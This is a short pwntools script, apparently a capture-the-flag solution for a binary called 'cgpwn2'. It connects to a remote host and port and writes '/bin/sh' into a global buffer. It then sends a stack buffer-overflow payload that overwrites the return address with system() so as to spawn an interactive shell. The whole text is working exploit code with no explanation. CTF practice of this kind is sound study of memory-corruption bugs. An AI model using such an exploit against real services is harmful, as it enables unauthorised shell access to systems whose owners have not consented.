from pwn import *

r = remote('61.147.171.105', 60701)
# r = process(r'./cgpwn2')
context.log_level = 'debug'

main_addr = 0x8048604
system_addr = 0x8048420
bss_addr = 0x804A080

payload = b'A' * (0x26 + 4) + p32(system_addr) + p32(main_addr) + p32(bss_addr)
r.sendlineafter(b'your name', b'/bin/sh\x00')
r.sendlineafter(b'here:', payload)
r.interactive()
